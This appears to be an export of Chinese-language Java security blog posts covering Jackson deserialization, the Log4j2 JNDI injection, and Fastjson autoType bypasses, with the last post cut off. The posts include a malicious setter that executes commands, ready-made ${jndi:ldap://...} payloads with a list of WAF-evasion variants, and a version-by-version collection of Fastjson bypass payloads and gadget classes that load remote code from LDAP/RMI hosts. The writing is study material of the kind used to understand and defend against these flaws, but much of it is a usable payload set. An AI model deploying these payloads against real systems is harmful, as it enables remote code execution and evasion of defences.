[{"content":"Jackson 基本使用 Jackson 简介 Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。\n由于其使用简单，速度较快，且不依靠除 JDK 外的其他库，被众多用户所使用。\n使用 Jackson 进行序列化与反序列化 依赖\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-databind\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.9\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.9\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.fasterxml.jackson.core\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jackson-annotations\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.7.9\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; 新建一个Person类\n1 2 3 4 5 6 7 8 public class Person { public int age; public String name; @Override public String toString() { return String.format(\u0026#34;Person.age=%d, Person.name=%s\u0026#34;, age, name); } Test类进行序列化和反序列化\n1 2 3 4 5 6 7 8 9 10 Person person = new Person(); person.age = 20; person.name = \u0026#34;ygsr\u0026#34;; ObjectMapper mapper = new ObjectMapper(); String json = mapper.writeValueAsString(person); System.out.println(json); Person person1 = mapper.readValue(json,Person.class); System.out.println(person1); writeValueAsString:将java对象序列化为JSON字符串 readValue: 将 JSON 数据反序列化为 Java 对象的方法 Jackson 对于多态问题的解决 —— JacksonPolymorphicDeserialization 机制 假设有一个父类和多个子类，JSON 数据中可能会包含不同类型的对象。Jackson 提供了几种方式来支持多态反序列化，其中最常用的是使用 @JsonTypeInfo 和 @JsonSubTypes 注解。 就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即 DefaultTyping 和 @JsonTypeInfo 注解\nJackson 提供一个 enableDefaultTyping 设置\n包含四个值\nJAVA_LANG_OBJECT OBJECT_AND_NON_CONCRETE NON_CONCRETE_AND_ARRAYS NON_FINAL JAVA_LANG_OBJECT JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个 Object 类型时，会对该 Object 类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个 Object 本身也得是一个可被序列化的类）\n新建一个hack类\n修改Person类,添加Object类型属性\n1 2 3 4 5 6 7 8 public int age; public String name; public Object object; @Override public String toString() { return String.format(\u0026#34;Person.age=%d, Person.name=%s,%s\u0026#34;, age, name,object == null ? \u0026#34;null\u0026#34; : object); } 新建Test.java,添加enableDefaultTyping() 并设置为 JAVA_LANG_OBJECT\n1 2 3 4 5 6 7 8 9 10 11 12 13 Person person = new Person(); person.age = 20; person.name = \u0026#34;ygsr\u0026#34;; person.object = new hack(); ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT); String json = mapper.writeValueAsString(person); System.out.println(json); Person person1 = mapper.readValue(json, Person.class); System.out.println(person1); 如果不设置JAVA_LANG_OBJECT\n可以发现设置了之后object属性被反序列化了,输出时是直接输出hack对象\nOBJECT_AND_NON_CONCRETE OBJECT_AND_NON_CONCRETE：除了前面提到的特征，当类里有 Interface、AbstractClass 类时，对其进行序列化和反序列化（当然这些类本身需要时合法的、可被序列化的对象）。\n添加Sex接口\n1 2 3 4 public interface Sex { public void setSex(int sex); public int getSex(); } 新建MySex类继承Sex接口\n1 2 3 4 5 6 7 8 9 10 11 12 public class MySex implements Sex{ int sex; @Override public void setSex(int sex) { this.sex = sex; } @Override public int getSex() { return sex; } } 修改Person类\n1 2 3 4 5 6 7 8 9 public int age; public String name; public Object object; public Sex sex; @Override public String toString() { return String.format(\u0026#34;Person.age=%d, Person.name=%s, %s, %s\u0026#34;, age, name, object == null ? \u0026#34;null\u0026#34; : object, sex == null ? \u0026#34;null\u0026#34; : sex); } 修改Test\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Person person = new Person(); person.age = 20; person.name = \u0026#34;ygsr\u0026#34;; person.object = new hack(); person.sex = new MySex(); ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE); String json = mapper.writeValueAsString(person); System.out.println(json); Person person1 = mapper.readValue(json, Person.class); System.out.println(person1); 可以看到该Interface类属性被成功序列化和反序列化\n不设置运行后报错\nNON_CONCRETE_AND_ARRAYS NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持 Array 类型。\n编写序列化与反序列化的代码，在 Object 属性中存在的是数组：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Person person = new Person(); person.age = 20; person.name = \u0026#34;ygsr\u0026#34;; hack[] hacks = new hack[2]; hacks[0] = new hack(); hacks[1] = new hack(); person.object = hacks; person.sex = new MySex(); ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS); String json = mapper.writeValueAsString(person); System.out.println(json); Person person1 = mapper.readValue(json, Person.class); System.out.println(person1); }} ``{\u0026ldquo;age\u0026rdquo;:20,\u0026ldquo;name\u0026rdquo;:\u0026ldquo;ygsr\u0026rdquo;,\u0026ldquo;object\u0026rdquo;:[\u0026quot;[LJAVA_LANG_OBJECT.hack;\u0026quot;,[[\u0026ldquo;JAVA_LANG_OBJECT.hack\u0026rdquo;,{\u0026ldquo;skill\u0026rdquo;:\u0026ldquo;dance\u0026rdquo;}],[\u0026ldquo;JAVA_LANG_OBJECT.hack\u0026rdquo;,{\u0026ldquo;skill\u0026rdquo;:\u0026ldquo;dance\u0026rdquo;}]]],\u0026ldquo;sex\u0026rdquo;:[\u0026ldquo;OBJECT_AND_NON_CONCRETE.MySex\u0026rdquo;,{\u0026ldquo;sex\u0026rdquo;:0}]}\n类名变成了 ”[L”+类名+”;”，序列化 Object 之后为数组形式，反序列化之后得到[Lcom.mi1k7ea.Hacker; 类对象，说明对 Array 类型成功进行了序列化和反序列化：\nNON_FINAL NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非 final 的属性，也就是相当于整个类、除 final 外的属性信息都需要被序列化和反序列化。\n这个不演示了\n小结 @JsonTypeInfo 注解 @JsonTypeInfo 注解是 Jackson 多态类型绑定的一种方式，支持下面5种类型的取值：\n1 2 3 4 5 @JsonTypeInfo(use = JsonTypeInfo.Id.NONE) @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS) @JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS) @JsonTypeInfo(use = JsonTypeInfo.Id.NAME) @JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM) JsonTypeInfo.Id.NONE 1 2 3 4 5 6 7 8 9 10 11 Person2 p = new Person2(); p.age = 6; p.name = \u0026#34;ygsr\u0026#34;; p.object = new hack(); ObjectMapper mapper = new ObjectMapper(); String json = mapper.writeValueAsString(p); System.out.println(json); Person2 p2 = mapper.readValue(json, Person2.class); System.out.println(p2); 1 2 3 4 5 6 7 8 9 10 public int age; public String name; //加上注解 @JsonTypeInfo(use = JsonTypeInfo.Id.NONE) public Object object; @Override public String toString() { return String.format(\u0026#34;Person.age=%d, Person.name=%s, %s\u0026#34;, age, name, object == null ? \u0026#34;null\u0026#34; : object); } 不加注解结果也是一样\nJsonTypeInfo.Id.CLASS 修改 Person2 类中的 object 属性 @JsonTypeInfo 注解值为 JsonTypeInfo.Id.CLASS\n输出看到，object属性中多了 \u0026quot;@class\u0026quot;:\u0026quot;com.drunkbaby.Hacker\u0026quot; ，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化：\n也就是说，在Jackson反序列化的时候如果使用了JsonTypeInfo.Id.CLASS修饰的话，可以通过@class的方式指定相关类，并进行相关调用。\nJsonTypeInfo.Id.MINIMAL_CLASS 修改 Person2 类中的object属性 @JsonTypeInfo 注解值为 JsonTypeInfo.Id.MINIMAL_CLASS\n输出看到，object属性中多了 \u0026quot;@c\u0026quot;:\u0026quot;com.drunkbaby.Hacker\u0026quot;，即使用 @c 替代了 @class，官方描述中的意思是缩短了相关类名，实际效果和 JsonTypeInfo.Id.CLASS 类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用：\nJsonTypeInfo.Id.NAME 修改 Person2 类中的object属性 @JsonTypeInfo 注解值为 JsonTypeInfo.Id.NAME\n输出看到，object 属性中多了 \u0026quot;@type\u0026quot;:\u0026quot;Hacker\u0026quot;，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：\nJsonTypeInfo.Id.CUSTOM 这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常\n反序列化中类属性方法的调用 使用 DefaultTyping 给MySex类加上构造方法\nTest只进行反序列化和enableDefaultTyping无参\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 Person person = new Person(); person.age = 20; person.name = \u0026#34;ygsr\u0026#34;; person.sex = new MySex(); ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(); // String json = mapper.writeValueAsString(person); // System.out.println(json); String json = \u0026#34;{\\\u0026#34;age\\\u0026#34;:20,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;ygsr\\\u0026#34;,\\\u0026#34;object\\\u0026#34;:null,\\\u0026#34;sex\\\u0026#34;:[\\\u0026#34;OBJECT_AND_NON_CONCRETE.MySex\\\u0026#34;,{\\\u0026#34;sex\\\u0026#34;:0}]}\u0026#34;; Person person1 = mapper.readValue(json, Person.class); System.out.println(person1); 调用了构造方法和set方法\n使用 @JsonTypeInfo 注解 Person类加上注解\n结果和上面使用DefaultTyping 一样\nJackson 反序列化调试分析 打上断点后调试\n先进行JsonToken初始化\n跳到ObjectMapper,进行反序列化\n进入后到BeanDeserializer\n进入后跳到vanillaDeserialize方法\n跟进到\n继续跟进\n这里判断JsonToken是否为空\n一直跟下去\n前面应该对每个属性进行逐一反序列化调用每个属性的setter方法赋值,这里轮到了sex属性,跟进\n这里就进到Mysex的setter方法去了,其实一开始应该是到call方法去,从而进到Mysex的构造方法里\n1 2 3 4 5 6 7 call:119, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect) createUsingDefault:243, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std) vanillaDeserialize:249, BeanDeserializer (com.fasterxml.jackson.databind.deser) deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser) _readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind) readValue:2797, ObjectMapper (com.fasterxml.jackson.databind) main:19, Test (OBJECT_AND_NON_CONCRETE) 结论 在 Jackson 反序列化中，若调用了 **enableDefaultTyping()** 函数或使用 **@JsonTypeInfo** 注解指定反序列化得到的类的属性为 **JsonTypeInfo.Id.CLASS** 或 **JsonTypeInfo.Id.MINIMAL_CLASS**，则会调用该属性的类的构造函数和 setter 方法。\nJackson 反序列化漏洞 前提条件 满足下面三个条件之一即存在Jackson反序列化漏洞：\n调用了 ObjectMapper.enableDefaultTyping() 函数； 对要进行反序列化的类的属性使用了值为 JsonTypeInfo.Id.CLASS 的 @JsonTypeInfo 注解； 对要进行反序列化的类的属性使用了值为 JsonTypeInfo.Id.MINIMAL_CLASS 的 @JsonTypeInfo 注解； 漏洞场景 属性不为Object类时 给MySex的setter方法里加入恶意代码\n反序列化完后弹计算器\n一般来说这都是程序员才能修改源码,谁家好人会放后门在自己的源码里\n属性为 Object 类时 当属性类型为 Object 时，因为 Object 类型是任意类型的父类，因此扩大了我们的攻击面，我们只需要寻找出在目标服务端环境中存在的且构造函数或 setter 方法存在漏洞代码的类即可进行攻击利用。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class evil { public String cmd; public evil() { } public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; try { Runtime.getRuntime().exec(this.cmd); }catch (Exception e) { e.printStackTrace(); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import com.fasterxml.jackson.annotation.JsonTypeInfo; public class EvilPerson { public int age; public String name; @JsonTypeInfo(use = JsonTypeInfo.Id.CLASS) public Object object; public EvilPerson() { } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public String getName() { return name; } public void setName(String name) { this.name = name; } public Object getObject() { return object; } public void setObject(Object object) { this.object = object; } @Override public String toString() { return \u0026#34;EvilPerson{\u0026#34; + \u0026#34;age=\u0026#34; + age + \u0026#34;, name=\u0026#39;\u0026#34; + name + \u0026#39;\\\u0026#39;\u0026#39; + \u0026#34;, object=\u0026#34; + object + \u0026#39;}\u0026#39;; } } 1 2 3 4 5 6 7 8 9 10 11 EvilPerson evilPerson = new EvilPerson(); evilPerson.age = 1; evilPerson.name = \u0026#34;ygsr\u0026#34;; evilPerson.object = new evil(); ObjectMapper mapper = new ObjectMapper(); // String json = mapper.writeValueAsString(evilPerson); // System.out.println(json); String json = \u0026#34;{\\\u0026#34;age\\\u0026#34;:1,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;ygsr\\\u0026#34;,\\\u0026#34;object\\\u0026#34;:{\\\u0026#34;@class\\\u0026#34;:\\\u0026#34;evil\\\u0026#34;,\\\u0026#34;cmd\\\u0026#34;:\\\u0026#34;calc\\\u0026#34;}}\u0026#34;; EvilPerson person1 = mapper.readValue(json,EvilPerson.class); System.out.println(person1); 通杀 利用的是Jackson中的PojoNode 他的toString是可以直接触发任意的getter的 触发条件如下\n不需要存在该属性 getter方法需要有返回值 尽可能的只有一个getter 很像fastjson漏洞\n代码实现\n","date":"2025-02-19T14:57:07+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/jackson/1_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/jackson/","title":"Jackson反序列化"},{"content":"基础开发 环境 jdk8u65 网上有很多说 jdk8u191 之后就不行了，其实不是的；高版本 jdk 是有绕过手段的。\nLog4j2 2.14.1 CC 3.2.1 (最好是) 依赖\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;junit\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;junit\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.12\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 代码实现 1 2 3 4 5 6 7 Logger logger = LogManager.getLogger(LongFunction.class); logger.trace(\u0026#34;trace level\u0026#34;); logger.debug(\u0026#34;debug level\u0026#34;); logger.info(\u0026#34;info level\u0026#34;); logger.warn(\u0026#34;warn level\u0026#34;); logger.error(\u0026#34;error level\u0026#34;); logger.fatal(\u0026#34;fatal level\u0026#34;); 实际开发场景 现在的代码是我们封装的一个行为，一般日志文件还是需要输出的。然后实际应用的话，是这样的。\n比如我从数据库获取到了一个 username 为 “Drunkbaby”，我要把它登录进来的信息打印到日志里面，这个路径一般有一个 /logs 的文件夹的。\n1 2 3 4 5 6 7 8 9 10 Logger logger = LogManager.getLogger(LongFunction.class); String username = \u0026#34;Drunkbaby\u0026#34;; if (username != null) { logger.info(\u0026#34;User {} login in!\u0026#34;, username); } else { logger.error(\u0026#34;User {} not exists\u0026#34;, username); } } 漏洞分析 影响版本 2.x \u0026lt;= log4j \u0026lt;= 2.15.0-rc1\n漏洞原理 username是我们可控的\n尝试输入其他的\nusername=\u0026quot;${java:os}\u0026quot;\n结果并不是直接输出java:os,而是输出了操作系统的一些信息\n而这里存在lookeup,从而导致JNDI注入漏洞\n漏洞复现 用yakit开一个ldap服务\n1 2 3 4 5 6 7 8 9 10 11 String name =\u0026#34;${jndi:ldap://127.0.0.1:8085/XFaOTtBf}\u0026#34;; if (name != null) { logger.info(\u0026#34;User {} is logging\u0026#34;,name); } else { logger.error(\u0026#34;User {} not exist\u0026#34;,name); } } debug代码调试 断点打在PatternLayout.toSerializable下\n往下走，先是一个循环，遍历 formatters 一段一段的拼接输出的内容，不是很重要。\n两个传进去进行处理的变量，一个是 event，也就是我们 log4j2 需要来进行日志打印的内容；另外一个 buffer，我们会把打印出来的东西写进 buffer。\n跟进到format里后,调用栈里有两个format跟进的地方\n当i=7的时候会进到第二个format里\n这里判断是不是lookup,用的是,进入for循环\n这个for循环是用来截取里${}里的内容\n然后进入replace\nStrSubstitutor\n再进入substitute\n进入substitute\n然后就是进入while循环,一连串的判断,循环,看不懂\n知道出循环了后\n能看到此时varNameExpr是jndi:ldap://127.0.0.1:8085/XFaOTtBf,去掉了${}\n继续跟进跳到\nvarName作为参数,resolveVariable这里是解析时支持关键词有{date, ctx, lower, upper, main, env, sys, sd, java, marker, jndi, jvmrunargs, event, bundle, map, log4j}\n像一开始试的java:os,这里就有\n跟进resolveVariable方法\n看到lookup方法了\n后续跟进也能看到的确实Jndi的lookeup方法\n小结调试 先判断内容中是否有${}，然后截取${}中的内容，得到我们的恶意payload jndi:xxx 后使用:分割payload，通过前缀来判断使用何种解析器去lookup 支持的前缀包括 date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，后续我们的绕过可能会用到这些。 针对 WAF 的常规绕过 出发点是基于很多 WAF 检测是否存在 jndi: 等关键词进行判断 1. 利用分隔符和多个 ${} 绕过 1 logg.info(\u0026#34;${${::-J}ndi:ldap://127.0.0.1:1389/Calc}\u0026#34;); 2. 通过 lower 和 upper 绕过 这一点，因为我们之前说允许的字段是这一些\ndate, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，其中就有 lower 和 upper\n同时也可以利用 lower 和 upper 来进行 bypass 关键字\n1 2 logg.info(\u0026#34;${${lower:J}ndi:ldap://127.0.0.1:1389/Calc}\u0026#34;); logg.info(\u0026#34;${${upper:j}ndi:ldap://127.0.0.1:1389/Calc}\u0026#34;); 同时也可以利用一些特殊字符的大小写转化的问题\nı =\u0026gt; upper =\u0026gt; i (Java 中测试可行) ſ =\u0026gt; upper =\u0026gt; S (Java 中测试可行) İ =\u0026gt; upper =\u0026gt; i (Java 中测试不可行) K =\u0026gt; upper =\u0026gt; k (Java 中测试不可行) 3.编码绕过 unicode编码或者hex编码\n4. 总结一些 payload 原始payload 1 \u0026#34;${jndi:ldap://127.0.0.1:1234/ExportObject}\u0026#34;; 对应的绕过手段\n1 2 3 4 5 6 7 8 9 ${${a:-j}ndi:ldap://127.0.0.1:1234/ExportObject}; ${${a:-j}n${::-d}i:ldap://127.0.0.1:1234/ExportObject}\u0026#34;; ${${lower:jn}di:ldap://127.0.0.1:1234/ExportObject}\u0026#34;; ${${lower:${upper:jn}}di:ldap://127.0.0.1:1234/ExportObject}\u0026#34;; ${${lower:${upper:jn}}${::-di}:ldap://127.0.0.1:1234/ExportObject}\u0026#34;; ","date":"2025-02-19T14:32:47+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/0_hu9956bd2b8819a55b37ccb90c62b2f008_204896_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/log4j2/","title":"Log4j2漏洞原理"},{"content":"原理 参考博客:博客\n看博客分析就是出现了一个checkAutoType函数,会判断autoTypeSupport是否为true,由于autoTypeSupport 默认为false,需要通过黑白名单变为true\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 bsh com.mchange com.sun. java.lang.Thread java.net.Socket java.rmi javax.xml org.apache.bcel org.apache.commons.beanutils org.apache.commons.collections.Transformer org.apache.commons.collections.functors org.apache.commons.collections4.comparators org.apache.commons.fileupload org.apache.myfaces.context.servlet org.apache.tomcat org.apache.wicket.util org.codehaus.groovy.runtime org.hibernate org.jboss org.mozilla.javascript org.python.core org.springframework 之前用的就是\ncom.sun.rowset.JdbcRowSetImpl被ban了,没法用了\n试了一下之前的payload会报错\nautoTypeSupport autoTypeSupport是checkAutoType()函数出现后ParserConfig.java中新增的一个配置选项，在checkAutoType()函数的某些代码逻辑起到开关的作用。\n默认情况下autoTypeSupport为False，将其设置为True有两种方法：\nJVM启动参数：-Dfastjson.parser.autoTypeSupport=true 代码中设置：ParserConfig.getGlobalInstance().setAutoTypeSupport(true);，如果有使用非全局ParserConfig则用另外调用setAutoTypeSupport(true); AutoType白名单设置方法：\nJVM启动参数：-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy. 代码中设置：ParserConfig.getGlobalInstance().addAccept(\u0026quot;com.xx.a\u0026quot;); 通过fastjson.properties文件配置。在1.2.25/1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao. 绕过 1.2.25 - 1.2.41 补丁绕过 既然 sun 包里面的这个 JdbcRowSetImpl 类被 ban 了，尝试在 com.sun.rowset.JdbcRowSetImpl 前面加一个 L，结尾加上 ; 绕过\n1 2 3 ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;Lcom.sun.rowset.JdbcRowSetImpl;\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:8085/SZbYoVCf\\\u0026#34;, \\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload); 可以绕过\nLcom.sun.rowset.JdbcRowSetImpl;这个本身是不存在的类\n原理解析 在ParserConfig.checkAutoType下断点,调试的时候会进入TypeUtils的loadClass方法\n进入loadClass方法能看到绕过的核心\n如果className是以L开头,;结尾的会截取掉开头结尾返回新的newClassName给loadClass\n1.2.25-1.2.42 补丁绕过 上面的payload到了1.2.42就不行了\n调试到这里的时候发现传入的Lcom.sun.rowset.JdbcRowSetImpl;已经开头结尾已经被截取掉了\n那payload继续双写\n1 2 3 ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;LLcom.sun.rowset.JdbcRowSetImpl;;\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:8085/SZbYoVCf\\\u0026#34;, \\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload); 1.2.25-1.2.43 补丁绕过 payload\n1 2 3 ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;[com.sun.rowset.JdbcRowSetImpl\\\u0026#34;[{,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:8085/SZbYoVCf\\\u0026#34;, \\\u0026#34;autoCommit\\\u0026#34;:true}\u0026#34;; JSON.parse(payload); 1.2.25-1.2.45补丁绕过 前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列\u0026lt;3.5.0的版本。\n直接给出payload，要连LDAP或RMI都可以：\nJSON\n1 2 3 4 5 6 7 { \u0026#34;@type\u0026#34;:\u0026#34;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;data_source\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34; } } 关键PoC：org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\n依赖\n1 2 3 4 5 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.mybatis\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;mybatis\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.4.6\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; org.apache.ibatis.datasource.jndi.JndiDataSourceFactory本身绕过黑名单,且setProperties满足fastjson调用setter\ndata_source可控\n1.2.25-1.2.47补丁绕过 本次Fastjson反序列化漏洞也是基于checkAutoType()函数绕过的，并且无需开启AutoTypeSupport，大大提高了成功利用的概率。\n绕过的大体思路是通过 java.lang.Class，将JdbcRowSetImpl类加载到Map中缓存，从而绕过AutoType的检测。因此将payload分两次发送，第一次加载，第二次执行。默认情况下，只要遇到没有加载到缓存的类，checkAutoType()就会抛出异常终止程序。\nDemo如下，无需开启AutoTypeSupport，本地Fastjson用的是1.2.47版本：\nEXP 如下\n1 2 3 4 5 String payload = \u0026#34;{\\\u0026#34;a\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;java.lang.Class\\\u0026#34;,\\\u0026#34;val\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;},\u0026#34; + \u0026#34;\\\u0026#34;b\\\u0026#34;:{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\u0026#34; + \u0026#34;\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://localhost:1389/Exploit\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:true}}\u0026#34;; JSON.parse(payload); } 补丁分析 由于1.2.47这个洞能够在不开启AutoTypeSupport实现RCE，因此危害十分巨大，看看是怎样修的。1.2.48中的修复措施是，在loadClass()时，将缓存开关默认置为False，所以默认是不能通过Class加载进缓存了。同时将Class类加入到了黑名单中。\n调试分析，在调用TypeUtils.loadClass()时中，缓存开关cache默认设置为了False，对比下两个版本的就知道了。\nFastjson \u0026lt;= 1.2.61 通杀 Fastjson1.2.5 \u0026lt;= 1.2.59 需要开启AutoType\n1 2 {\u0026#34;@type\u0026#34;:\u0026#34;com.zaxxer.hikari.HikariConfig\u0026#34;,\u0026#34;metricRegistry\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;com.zaxxer.hikari.HikariConfig\u0026#34;,\u0026#34;healthCheckRegistry\u0026#34;:\u0026#34;ldap://localhost:1389/Exploit\u0026#34;} Fastjson1.2.5 \u0026lt;= 1.2.60 需要开启 autoType：\n1 2 3 {\u0026#34;@type\u0026#34;:\u0026#34;oracle.jdbc.connector.OracleManagedConnectionFactory\u0026#34;,\u0026#34;xaDataSourceName\u0026#34;:\u0026#34;rmi://10.10.20.166:1099/ExportObject\u0026#34;} {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.commons.configuration.JNDIConfiguration\u0026#34;,\u0026#34;prefix\u0026#34;:\u0026#34;ldap://10.10.20.166:1389/ExportObject\u0026#34;} Fastjson1.2.5 \u0026lt;= 1.2.61 1 {\u0026#34;@type\u0026#34;:\u0026#34;org.apache.commons.proxy.provider.remoting.SessionBeanProvider\u0026#34;,\u0026#34;jndiName\u0026#34;:\u0026#34;ldap://localhost:1389/Exploi ","date":"2025-01-08T14:49:50+08:00","image":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/26_hu1bf91eafd363a6a8cf12bcea22325fb0_892347_120x120_fill_q75_box_smart1.jpg","permalink":"https://gsygsr.github.io/java/java%E5%AE%89%E5%85%A8/fastjson/fastjson3/","title":"Fastjson各版本绕过分析"},{"content":"1.2.62 反序列化漏洞 前提条件 需要开启AutoType； Fastjson \u0026lt;= 1.2.62； JNDI注入利用所受的JDK版本限制； 目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限，我这里把 pom.xml 贴出来。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.62\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.xbean\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;xbean-reflect\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;4.18\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; 